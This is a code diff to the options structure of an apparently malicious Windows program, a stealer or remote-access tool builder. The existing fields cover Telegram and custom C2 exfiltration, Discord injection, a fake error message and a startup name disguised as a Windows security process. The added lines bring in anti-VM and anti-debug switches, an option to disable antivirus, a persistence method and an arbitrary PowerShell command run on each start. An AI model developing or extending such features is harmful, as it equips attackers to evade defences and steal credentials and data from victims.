@@ -11,6 +11,7 @@ struct options {
     std::string telegram_chat_id;
     std::string password;
     bool install = false;
+    std::string startup_method = "user";
     std::string startup_name = "SecurityHealthSystray.exe";
     std::string appdata_dir = "SecurityHealthSystray";
     bool ping_everyone = false;
@@ -22,6 +23,11 @@ struct options {
     std::string fake_error_message;
     bool discord_injection = false;
     std::string injection_script;
+    bool anti_vm = false;
+    bool anti_debug = false;
+    bool disable_av = false;
+    std::string powershell_command;
+    bool powershell_every_run = false;
     std::string thumbnail_url;
     std::string custom_c2_url;
     std::string custom_c2_file_field;
